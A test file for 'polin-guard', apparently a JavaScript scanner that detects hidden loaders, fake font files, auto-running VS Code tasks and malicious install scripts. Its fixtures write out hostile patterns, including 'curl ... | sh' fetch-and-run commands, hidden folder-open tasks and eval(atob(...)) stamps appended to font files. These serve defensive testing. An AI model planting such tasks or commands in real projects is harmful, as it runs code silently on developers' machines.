'use strict';

// Zero-dependency test runner for polin-guard v0.2 (scoring engine + evasion).
const fs = require('fs');
const path = require('path');
const { scanContent, analyzeLine, loadConfig, entropy } = require('../src/scan');

let passed = 0, failed = 0;
function check(name, cond) {
  if (cond) { passed++; process.stdout.write(`  ok   ${name}\n`); }
  else { failed++; process.stdout.write(`  FAIL ${name}\n`); }
}

const cwd = path.join(__dirname, '..');
const cfg = loadConfig(cwd);
const FX = path.join(__dirname, 'fixtures');
const read = (f) => fs.readFileSync(path.join(FX, f), 'utf8');
const scan = (f) => scanContent(f, read(f), cfg);
const hasCritical = (findings) => findings.some((x) => x.severity === 'critical');

// --- Clean / true-positive baseline ---------------------------------------
check('clean fixture: no findings', scan('clean.config.js').length === 0);
check('known payload: blocked (critical)', hasCritical(scan('malicious.config.js')));

// --- Evasion resistance (the v0.2 point) ----------------------------------
const renamed = scan('evade-renamed.config.js');
check('EVASION renamed payload: still blocked', hasCritical(renamed));
check('  ...caught WITHOUT a known signature (structural)',
  renamed.every((f) => !/global-bang-key|char-shuffle-cipher|global-underscore/.test(f.ruleId)) &&
  renamed.some((f) => /concealment/.test(f.message)));

const split = scan('evade-split.config.js');
check('EVASION split-across-lines payload: still blocked', hasCritical(split));
check('  ...caught by the file-level pass', split.some((f) => f.ruleId === 'file-region' && f.severity === 'critical'));

const rf = scan('evade-runtime-fetch.config.js');
check('EVASION runtime-fetched payload: still blocked', hasCritical(rf));
check('  ...caught by network+exec combo', rf.some((f) => /network access \+ code-exec/.test(f.message)));

// --- False-positive guards -------------------------------------------------
check('FP guard: long data line is NOT critical', !hasCritical(scan('legit-bigdata.js')));
check('FP guard: ordinary dynamic require is NOT critical', !hasCritical(scan('legit-dynamic-require.js')));
check('FP guard: ordinary literal require not flagged at all',
  scanContent('c.js', 'const fs = require("fs");\nmodule.exports = {};\n', cfg).length === 0);

// --- Scoring engine internals ---------------------------------------------
const conceal = analyzeLine('x;' + ' '.repeat(100) + 'var y=Function("return 1")();', cfg, {});
check('concealment is a heavy signal', conceal.signals.some((s) => s.id === 'concealment'));
check('concealment line scores critical', conceal.score >= cfg.criticalScore);

const plain = analyzeLine('const a = 1 + 2;', cfg, {});
check('plain code scores 0', plain.score === 0);

check('entropy: random string > structured text', entropy('a8F!x2@qZ9#wL5') > entropy('aaaaaaaaaaaaaa'));

// --- Allow markers ---------------------------------------------------------
check('allow-next-line suppresses',
  scanContent('a.js', '// polinguard-allow-next-line\nx;' + ' '.repeat(100) + 'y;\n', cfg).length === 0);
check('allow-line inline suppresses',
  scanContent('b.js', 'x;' + ' '.repeat(100) + 'y; // polinguard-allow-line\n', cfg).length === 0);

// --- Delivery artifacts (fake fonts, folder-open tasks, push tooling) -----
// Synthetic, inert samples shaped like the Oct-2026 PolinRider wave, scanned through run() so file selection
// (non-code extensions) is covered too.
const { run } = require('../src/scan');
const os2 = require('os');
const art = fs.mkdtempSync(path.join(os2.tmpdir(), 'pg-art-'));
const put = (rel, data, enc = 'utf8') => {
  fs.mkdirSync(path.dirname(path.join(art, rel)), { recursive: true });
  fs.writeFileSync(path.join(art, rel), data, enc);
  return rel;
};
const tabbed = "\t".repeat(421) + "global['!'] = '8-J';var _0x1=function(){return 0};_0x1();\n";
// Structurally valid font headers with a deterministic binary body (no code markers).
const noise = (n, seed = 7) => { const b = Buffer.alloc(n); for (let i = 0; i < n; i++) { seed = (seed * 1103515245 + 12345) >>> 0; b[i] = seed >>> 24; } return b; };
const woff2 = (tail = Buffer.alloc(0)) => {
  const body = noise(240);
  const h = Buffer.alloc(48);
  h.write('wOF2', 0, 'latin1'); h.writeUInt32BE(0x00010000, 4); h.writeUInt32BE(48 + body.length + tail.length, 8);
  h.writeUInt16BE(1, 12); h.writeUInt16BE(0, 14); h.writeUInt32BE(1000, 16); h.writeUInt32BE(body.length, 20);
  return Buffer.concat([h, body, tail]);
};
const ttf = () => {
  const h = Buffer.alloc(12 + 16);
  h.writeUInt32BE(0x00010000, 0); h.writeUInt16BE(1, 4); h.writeUInt16BE(16, 6); h.writeUInt16BE(0, 8); h.writeUInt16BE(0, 10);
  h.write('glyf', 12, 'latin1'); h.writeUInt32BE(28, 20); h.writeUInt32BE(200, 24);
  return Buffer.concat([h, noise(200, 11)]);
};
const files = {
  llf: put('public/fonts/fa-solid-300.llf', tabbed),
  fakeWoff2: put('public/fonts/fa-solid-500.woff2', 'var inert = 0;\n'),
  realWoff2: put('public/fonts/real.woff2', woff2(), null),
  realTtf: put('public/fonts/real.ttf', ttf(), null),
  tasksEvil: put('evil/.vscode/tasks.json', '{ "version": "2.0.0", "tasks": [ { "label": "eslint-check", "type": "shell",\n' +
    '  "command": "node ./public/fonts/fa-solid-300.llf",\n  "presentation": { "reveal": "never", "echo": false },\n' +
    '  "runOptions": { "\\u0072unOn": "folderOpen" } }, ] }\n'),
  tasksPlainOpen: put('dev/.vscode/tasks.json', '{ "tasks": [ { "label": "dev", "type": "npm", "script": "dev", "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  tasksBuild: put('ok/.vscode/tasks.json', '{ "tasks": [ { "label": "build", "type": "shell", "command": "npm run build" } ] }\n'),
  settingsAuto: put('evil/.vscode/settings.json', '{ "task.allowAutomaticTasks": "on" }\n'),
  settingsOk: put('ok/.vscode/settings.json', '{ "editor.tabSize": 2 }\n'),
  ignoreEvil: put('evil/.gitignore', 'node_modules\ntemp_auto_push.bat\nbranch_structure.json\n'),
  ignoreOk: put('ok/.gitignore', 'node_modules\n.env\n'),
  pushTool: put('tools/branch_structure.json', '{"branches":[]}\n'),
  tabConfig: put('web/postcss.config.js', 'module.exports = {};' + tabbed),
  // review regressions (PR #4)
  trueWoff2: put('r1/fonts/loader.woff2', 'true;' + tabbed),
  magicTextWoff2: put('r1/fonts/m.woff2', 'wOF2' + '=0;var inert = 1;\n'.repeat(20)),
  splitTask: put('r2/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "type": "process", "command": "node",\n' +
    '  "args": ["public/fonts/loader.llf"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  commentTask: put('r3/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "type": "shell", "command": "node ./public/fonts/x.llf",\n' +
    '  "runOptions": { "runOn": /* hide */ "folderOpen" } }, ] }\n'),
  mixedTasks: put('r4/.vscode/tasks.json', '{ "tasks": [\n' +
    '  { "label": "dev", "type": "npm", "script": "dev", "runOptions": { "runOn": "folderOpen" } },\n' +
    '  { "label": "quiet build", "type": "shell", "command": "npm run build", "presentation": { "reveal": "never" } } ] }\n'),
  ignoreBenign: put('r5/.gitignore', '# temp_auto_push.bat is the PolinRider push tool\n!temp_auto_push.bat\n*.bat\n*.json\n'),
  ignoreGlob: put('r6/.gitignore', 'node_modules\ntemp_auto_*.bat\n'),
  // second review round
  commentPaddedWoff2: put('r7/fonts/a.woff2', Buffer.concat([Buffer.from('wOF2=0;/*', 'latin1'), noise(300, 3),
    Buffer.from("*/\nglobal['!'] = '8-J';eval(atob(process.env.K));\n", 'latin1')]), null),
  validHeaderWithCode: put('r7/fonts/b.woff2', woff2(Buffer.from("\n;global['!'] = '8-J';eval(atob(process.env.K));\n", 'latin1')), null),
  farTrailingComma: put('r8/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "type": "shell",\n' +
    '  "command": "node \\"public/fonts/loader.llf\\"", "runOptions": { "runOn": "folderOpen" } },' +
    ' '.repeat(80) + '// ' + 'x'.repeat(80) + '\n ] }\n'),
  osMixed: put('r9/.vscode/tasks.json', '{ "tasks": [ { "label": "dev", "type": "shell", "command": "npm run dev",\n' +
    '  "windows": { "command": "node" }, "linux": { "args": ["public/fonts/x.llf"] },\n' +
    '  "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  // security review (PR #4): inputs VS Code still auto-runs
  runOnCase: put('s1/.vscode/tasks.json', '{ "tasks": [ { "label": "setup", "type": "shell", "command": "node public/img/logo.png",\n' +
    '  "runOptions": { "runOn": "FolderOpen" } } ] }\n'),
  worktreeTask: put('s2/.vscode/tasks.json', '{ "tasks": [ { "label": "wt", "type": "shell", "command": "curl -s https://example.invalid/p | sh",\n' +
    '  "runOptions": { "runOn": "worktreeCreated" } } ] }\n'),
  osList: put('s3/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "tasks": [ { "label": "x", "type": "shell",\n' +
    '  "command": "curl -s https://example.invalid/p | sh", "runOptions": { "runOn": "folderOpen" } } ] } }\n'),
  upperPath: put('s4/.VSCode/Tasks.json', '{ "tasks": [ { "label": "setup", "type": "shell", "command": "node public/img/logo.png",\n' +
    '  "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  dependsOnTask: put('s5/.vscode/tasks.json', '{ "tasks": [\n' +
    '  { "label": "b", "type": "shell", "command": "curl -s https://example.invalid/p | sh" },\n' +
    '  { "label": "init", "dependsOn": ["b"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  legacyHidden: put('s6/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "type": "shell", "command": "npm run watch",\n' +
    '  "terminal": { "reveal": "Never" }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  dependsOnBenign: put('s7/.vscode/tasks.json', '{ "tasks": [\n' +
    '  { "label": "build", "type": "shell", "command": "npm run build" },\n' +
    '  { "label": "watch", "dependsOn": "build", "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  brokenCase: put('s8/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "command": "node public/fonts/x.llf",\n' +
    '  "runOptions": { "runOn": "FOLDEROPEN" } }\n'),
  // verification round on the security fixes: VS Code merge semantics
  hideDep: put('v1/.vscode/tasks.json', '{ "version": "2.0.0", "tasks": [ { "label": "install", "type": "shell", "command": "npm install", "hide": true },\n' +
    '  { "label": "dev", "type": "shell", "command": "npm run dev", "dependsOn": ["install"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  legacyOverridden: put('v2/.vscode/tasks.json', '{ "version": "2.0.0", "showOutput": "never", "tasks": [\n' +
    '  { "label": "a", "type": "shell", "command": "npm run a", "showOutput": "never", "presentation": { "reveal": "always" }, "runOptions": { "runOn": "folderOpen" } },\n' +
    '  { "label": "b", "type": "shell", "command": "npm run b", "presentation": { "reveal": "always" }, "runOptions": { "runOn": "folderOpen" } },\n' +
    '  { "label": "c", "type": "shell", "command": "npm run c", "echoCommand": false, "presentation": { "echo": true, "reveal": "always" }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  osBlockDepends: put('v3/.vscode/tasks.json', '{ "version": "2.0.0", "tasks": [ { "label": "b", "type": "shell", "command": "npm run watch", "presentation": { "reveal": "never" } },\n' +
    '  { "label": "dev", "type": "shell", "command": "npm run dev", "windows": { "dependsOn": "b" }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  nullCommand: put('v4/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "command": "curl -s https://example.invalid/p | sh" },\n' +
    '  "tasks": [ { "label": "dev", "type": "shell", "command": null, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  nullReveal: put('v5/.vscode/tasks.json', '{ "version": "2.0.0", "presentation": { "reveal": "never" }, "tasks": [ { "label": "dev", "type": "shell",\n' +
    '  "command": "npm run setup", "presentation": { "reveal": null }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  fileArgs: put('v6/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "command": "node", "args": ["public/fonts/fa-solid-300.llf"] },\n' +
    '  "tasks": [ { "label": "dev", "args": ["--watch"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
  osListScope: put('v7/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "tasks": [ { "label": "a", "type": "shell", "command": "echo a", "dependsOn": "b",\n' +
    '  "windows": { "command": "curl -s https://example.invalid/p | sh" }, "runOptions": { "runOn": "folderOpen" } } ] },\n' +
    '  "windows": { "tasks": [ { "label": "b", "type": "shell", "command": "curl -s https://example.invalid/p | sh" } ] },\n' +
    '  "tasks": [ { "label": "b", "type": "shell", "command": "echo b" } ] }\n'),
  workspaceNoTasks: put('v8/a.code-workspace', '{ "folders": [ { "path": "." } ], "launch": { "configurations": [ { "name": "x", "runOn": "FolderOpen" } ] } }\n'),
  osEvil: put('r10/.vscode/tasks.json', '{ "tasks": [ { "label": "dev", "type": "shell", "command": "npm run dev",\n' +
    '  "osx": { "command": "node", "args": ["public/fonts/x.llf"] }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
};
const res = run({ mode: 'paths', cwd: art, paths: Object.values(files) });
const at = (rel) => res.findings.filter((f) => f.file === rel);
const crit = (rel, rule) => at(rel).some((f) => f.severity === 'critical' && (!rule || f.ruleId === rule));
check('ART: .llf loader is read and blocked as a fake font', crit(files.llf, 'fake-font'));
check('ART: .llf content also line-scored (tab-padded stamp)', at(files.llf).some((f) => f.ruleId !== 'fake-font'));
check('ART: text .woff2 is a fake font', crit(files.fakeWoff2, 'fake-font'));
check('ART: real woff2 / ttf headers are not flagged', at(files.realWoff2).length === 0 && at(files.realTtf).length === 0);
check('ART: hidden folder-open task running a font-named file blocks (escaped key too)', crit(files.tasksEvil, 'vscode-autorun'));
check('ART: plain folder-open npm task only warns', at(files.tasksPlainOpen).some((f) => f.severity === 'warning') && !crit(files.tasksPlainOpen));
check('ART: ordinary build task not flagged', at(files.tasksBuild).length === 0);
check('ART: committed task.allowAutomaticTasks blocks', crit(files.settingsAuto, 'vscode-auto-tasks'));
check('ART: ordinary settings.json not flagged', at(files.settingsOk).length === 0);
check('ART: .gitignore hiding the push tool blocks', crit(files.ignoreEvil, 'push-tool-ignored'));
check('ART: ordinary .gitignore not flagged', at(files.ignoreOk).length === 0);
check('ART: branch_structure.json push-tool file blocks', crit(files.pushTool, 'push-tool'));
check('ART: tab-padded loader in a config blocks', crit(files.tabConfig));
check('ART: run() reports blocking', res.blocking === true);
check('REVIEW: .woff2 starting with the TrueType tag "true" is still a fake font', crit(files.trueWoff2, 'fake-font'));
check('REVIEW: valid wOF2 header followed by plain text is a fake font', crit(files.magicTextWoff2, 'fake-font'));
check('REVIEW: node in command + font file in args blocks', crit(files.splitTask, 'vscode-autorun'));
check('REVIEW: comment between runOn and folderOpen does not hide the task', crit(files.commentTask, 'vscode-autorun'));
check('REVIEW: hidden manual task does not escalate a plain folder-open task',
  !crit(files.mixedTasks) && at(files.mixedTasks).some((f) => f.severity === 'warning' && /"dev"/.test(f.message)));
check('REVIEW: .gitignore comment, negation and broad *.bat/*.json are not flagged', at(files.ignoreBenign).length === 0);
check('REVIEW: .gitignore wildcard temp_auto_*.bat is flagged', crit(files.ignoreGlob, 'push-tool-ignored'));
check('REVIEW2: wOF2 + binary bytes in a JS comment is a fake font', crit(files.commentPaddedWoff2, 'fake-font'));
check('REVIEW2: well-formed font header with code appended blocks (code-in-font)', crit(files.validHeaderWithCode, 'code-in-font'));
check('REVIEW2: trailing comma far from its bracket + escaped quotes still blocks', crit(files.farTrailingComma, 'vscode-autorun'));
check('REVIEW2: windows command + linux args are not paired into one command', !crit(files.osMixed) &&
  at(files.osMixed).some((f) => f.severity === 'warning'));
check('REVIEW2: a dangerous per-OS command still blocks, naming the OS', at(files.osEvil).some((f) => f.severity === 'critical' && /on osx/.test(f.message)));
check('SEC: runOn "FolderOpen" (VS Code lowercases it) blocks', crit(files.runOnCase, 'vscode-autorun'));
check('SEC: runOn worktreeCreated task that downloads code blocks', crit(files.worktreeTask, 'vscode-autorun'));
check('SEC: task in the file-level osx task list blocks', crit(files.osList, 'vscode-autorun'));
check('SEC: .VSCode/Tasks.json is checked like .vscode/tasks.json', crit(files.upperPath, 'vscode-autorun'));
check('SEC: dangerous dependsOn task of a folder-open task blocks',
  at(files.dependsOnTask).some((f) => f.severity === 'critical' && /dependsOn task "b"/.test(f.message)));
check('SEC: legacy terminal.reveal "Never" counts as hidden', crit(files.legacyHidden, 'vscode-autorun'));
check('SEC: benign dependsOn task keeps a plain warning', !crit(files.dependsOnBenign) &&
  at(files.dependsOnBenign).some((f) => f.severity === 'warning'));
check('SEC: unparseable tasks file with runOn "FOLDEROPEN" blocks', crit(files.brokenCase, 'vscode-autorun'));
const onlyWarnings = (rel, n) => !crit(rel) && at(rel).filter((f) => f.severity === 'warning').length === n;
check('SEC2: hide (quick-pick only) on a dependsOn task is not "hidden"', onlyWarnings(files.hideDep, 1));
check('SEC2: presentation.reveal/echo override legacy showOutput/echoCommand', onlyWarnings(files.legacyOverridden, 3));
check('SEC2: dependsOn inside a task\'s OS block is ignored, as VS Code ignores it', onlyWarnings(files.osBlockDepends, 1));
check('SEC2: null task command falls back to the file command', crit(files.nullCommand, 'vscode-autorun'));
check('SEC2: null reveal falls back to the file reveal', crit(files.nullReveal, 'vscode-autorun'));
check('SEC2: file command + file args + task args are judged together',
  at(files.fileArgs).some((f) => f.severity === 'critical' && /on osx/.test(f.message)));
check('SEC2: an osx-list task is judged on osx only, with osx dependencies', onlyWarnings(files.osListScope, 1));
check('SEC2: parseable .code-workspace without tasks is not reported', at(files.workspaceNoTasks).length === 0);
{
  // dependsOn analysis stays fast at the limits: a dense graph, and every reference resolving to every task.
  const { scanArtifacts } = require('../src/artifacts');
  const timed = (tasks) => {
    const t0 = process.hrtime.bigint();
    const r = scanArtifacts('.vscode/tasks.json', JSON.stringify({ version: '2.0.0', tasks }));
    return { r, ms: Math.round(Number(process.hrtime.bigint() - t0) / 1e6) };
  };
  const auto = { runOn: 'folderOpen' };
  const dense = timed(Array.from({ length: 70 }, (_, i) => ({ label: `t${i}`, command: 'npm run x',
    dependsOn: Array.from({ length: 70 }, (_, j) => `t${j}`), runOptions: auto })));
  check(`SEC2: dense dependsOn graph scans fast (${dense.ms} ms)`, dense.ms < 2000 && dense.r.findings.length === 70);
  const same = timed(Array.from({ length: 1000 }, () => ({ label: 'x', command: 'npm run x', dependsOn: ['x', 'x', 'x', 'x', 'x'], runOptions: auto })));
  check(`SEC2: shared-label dependsOn graph scans fast (${same.ms} ms)`, same.ms < 2000 && same.r.findings.length === 1000);
  const huge = JSON.stringify({ version: '2.0.0', tasks: Array.from({ length: 1001 }, (_, i) => ({ label: `t${i}`, command: 'echo' })) });
  check('SEC2: over-limit task file is reported for review', scanArtifacts('.vscode/tasks.json', huge).findings
    .some((f) => f.severity === 'critical' && /review it by hand/.test(f.message)));
}
fs.rmSync(art, { recursive: true, force: true });

// --- Supply-chain layer ----------------------------------------------------
const { auditInstall, harden, levenshtein } = require('../src/supplychain');
const os = require('os');
const SC = path.join(FX, 'sc');
const audit = (d) => auditInstall(path.join(SC, d));

check('SC: clean project has no critical/warning', (() => { const r = audit('clean'); return r.critical.length === 0 && r.warnings.length === 0; })());
check('SC: malicious postinstall (curl|bash) blocks', audit('malicious').findings.some((f) => f.ruleId === 'malicious-script' && f.severity === 'critical'));
check('SC: typosquat dependency blocks', audit('typosquat').findings.some((f) => f.ruleId === 'typosquat' && f.severity === 'critical'));
check('SC: git-source dependency warns', audit('gitdep').findings.some((f) => f.ruleId === 'non-registry-source'));
check('SC: foreign-registry lock entry blocks', audit('foreignlock').findings.some((f) => f.ruleId === 'foreign-registry' && f.severity === 'critical'));
check('SC: counts install-script packages', audit('foreignlock').findings.some((f) => f.ruleId === 'install-script-count'));
check('SC: official-registry package (sharp) NOT flagged as foreign',
  !audit('foreignlock').findings.some((f) => f.ruleId === 'foreign-registry' && /sharp/.test(f.message)));
check('SC: levenshtein basic', levenshtein('expres', 'express') === 1 && levenshtein('abc', 'abc') === 0);

// harden in a throwaway dir (don't touch the project)
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'pg-harden-'));
const h1 = harden(tmp, { fix: false });
check('SC harden: reports ignore-scripts not set', h1.hasIgnore === false && h1.applied === false);
const h2 = harden(tmp, { fix: true });
check('SC harden: --fix writes ignore-scripts', h2.applied === true && /ignore-scripts=true/.test(fs.readFileSync(path.join(tmp, '.npmrc'), 'utf8')));
const h3 = harden(tmp, { fix: false });
check('SC harden: detects it is now enabled', h3.hasIgnore === true);
fs.rmSync(tmp, { recursive: true, force: true });

process.stdout.write(`\n${passed} passed, ${failed} failed\n`);
process.exit(failed === 0 ? 0 : 1);
